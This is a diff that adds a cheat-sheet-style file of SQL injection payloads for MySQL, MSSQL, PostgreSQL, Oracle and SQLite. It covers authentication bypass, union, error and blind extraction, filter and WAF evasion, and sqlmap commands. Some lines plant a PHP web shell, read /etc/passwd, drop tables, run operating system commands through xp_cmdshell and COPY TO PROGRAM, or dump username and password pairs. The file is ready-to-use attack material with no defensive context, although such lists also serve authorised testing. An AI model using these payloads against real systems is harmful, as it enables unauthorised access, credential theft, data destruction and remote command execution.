@@ -1,0 +1,310 @@
+# SQL Injection Payloads
+
+## ========================================
+## DETECTION PAYLOADS
+## ========================================
+
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin' --
+admin' #
+admin'/*
+' or 1=1 limit 1 --
+'=or'=
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+
+## ========================================
+## MYSQL INJECTION
+## ========================================
+
+# Basic Authentication Bypass
+admin' or '1'='1
+admin' or 1=1-- -
+admin' or 1=1#
+admin'/**/or/**/1=1-- -
+
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+
+# Error-based
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# Boolean-based Blind
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--
+
+# Time-based Blind
+' AND SLEEP(5)--
+' AND (SELECT SLEEP(5))--
+' AND IF(1=1,SLEEP(5),0)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+# Database Enumeration
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+
+# Data Extraction
+' UNION SELECT username,password FROM users--
+' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
+' UNION SELECT NULL,GROUP_CONCAT(username,':',password) FROM users--
+
+# File Operations
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+
+# MySQL Functions
+' AND (SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')--
+' AND EXISTS(SELECT * FROM users WHERE username='admin')--
+
+## ========================================
+## MSSQL INJECTION
+## ========================================
+
+# Authentication Bypass
+admin'--
+admin' OR 1=1--
+
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT @@version--
+' UNION SELECT name FROM sys.databases--
+' UNION SELECT name FROM sys.tables--
+' UNION SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')--
+
+# Error-based
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CAST((SELECT @@version) AS int)--
+
+# Stacked Queries
+'; DROP TABLE users--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
+
+# Time-based Blind
+'; WAITFOR DELAY '00:00:05'--
+' IF (1=1) WAITFOR DELAY '00:00:05'--
+
+# Boolean-based Blind
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(@@version,1,1)='M'--
+
+# Database Enumeration
+' UNION SELECT name FROM master..sysdatabases--
+' UNION SELECT name FROM sys.tables--
+
+# Command Execution
+'; EXEC xp_cmdshell 'dir'--
+'; EXEC master..xp_cmdshell 'net user'--
+
+## ========================================
+## POSTGRESQL INJECTION
+## ========================================
+
+# Authentication Bypass
+admin'--
+admin' OR 1=1--
+
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT version()--
+' UNION SELECT datname FROM pg_database--
+' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--
+
+# Error-based
+' AND CAST(version() AS int)=1--
+
+# Time-based Blind
+' AND pg_sleep(5)--
+' AND (SELECT pg_sleep(5))--
+
+# Boolean-based Blind
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(version(),1,1)='P'--
+
+# Command Execution (requires superuser)
+'; COPY (SELECT '') TO PROGRAM 'whoami'--
+'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec--
+
+# File Operations
+'; CREATE TABLE file_output(data text); COPY file_output FROM '/etc/passwd'; SELECT * FROM file_output--
+
+## ========================================
+## ORACLE SQL INJECTION
+## ========================================
+
+# Authentication Bypass
+admin'--
+admin' OR '1'='1
+
+# Union-based
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT banner FROM v$version--
+' UNION SELECT table_name FROM all_tables--
+' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
+
+# Error-based
+' AND CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))=1--
+
+# Time-based Blind
+' AND DBMS_LOCK.SLEEP(5)=1--
+
+# Boolean-based Blind
+' AND 1=1--
+' AND 1=2--
+
+# Database Enumeration
+' UNION SELECT owner,table_name FROM all_tables--
+
+## ========================================
+## SQLITE INJECTION
+## ========================================
+
+# Authentication Bypass
+admin'--
+admin' OR 1=1--
+
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT sqlite_version()--
+' UNION SELECT name FROM sqlite_master WHERE type='table'--
+' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users'--
+
+# Time-based Blind (limited)
+' AND randomblob(100000000)--
+
+# Boolean-based Blind
+' AND 1=1--
+' AND 1=2--
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Comment-based Bypass
+SELECT/**/* FROM users--
+SELECT/*test*/* FROM/*test*/users--
+
+# Case Manipulation
+SeLeCt * FrOm users
+sELEct * fROM users
+
+# Whitespace Bypass
+SELECT/**/username/**/FROM/**/users
+SELECT%09username%09FROM%09users
+SELECT%0Ausername%0AFROM%0Ausers
+
+# Keyword Replacement
+' UNI ON SELECT--
+' UN/**/ION/**/ SELECT--
+
+# Hex Encoding (MySQL)
+SELECT 0x75736572
+SELECT CHAR(117,115,101,114)
+
+## ========================================
+## SQLMAP USAGE
+## ========================================
+
+# Basic Scan
+sqlmap -u "http://site.com/page?id=1"
+
+# POST Data
+sqlmap -u "http://site.com/login" --data="username=admin&password=pass"
+
+# Database Enumeration
+sqlmap -u "http://site.com/page?id=1" --dbs
+sqlmap -u "http://site.com/page?id=1" -D dbname --tables
+sqlmap -u "http://site.com/page?id=1" -D dbname -T tablename --columns
+sqlmap -u "http://site.com/page?id=1" -D dbname -T users --dump
+
+# OS Shell
+sqlmap -u "http://site.com/page?id=1" --os-shell
+
+# File Operations
+sqlmap -u "http://site.com/page?id=1" --file-read="/etc/passwd"
+sqlmap -u "http://site.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Tamper Scripts
+sqlmap -u "http://site.com/page?id=1" --tamper=space2comment
+sqlmap -u "http://site.com/page?id=1" --level=5 --risk=3
+
+## ========================================
+## WAF BYPASS
+## ========================================
+
+# Inline Comments (MySQL)
+/*!50000UNION*/ /*!50000SELECT*/
+/*!12345UNION*/ /*!12345SELECT*/
+
+# Scientific Notation
+UNION SELECT 1e0,2e0,3e0
+
+# NULL Byte
+%00' UNION SELECT%00
+
+# URL Encoding
+%27%20UNION%20SELECT%20
+
+# Double URL Encoding
+%2527%2520UNION%2520SELECT%2520
+
+## ========================================
+## POLYGLOT PAYLOADS
+## ========================================
+
+' OR '1'='1' --
+1' ORDER BY 1--+
+1' UNION SELECT null--
+admin' --
+') OR ('1'='1
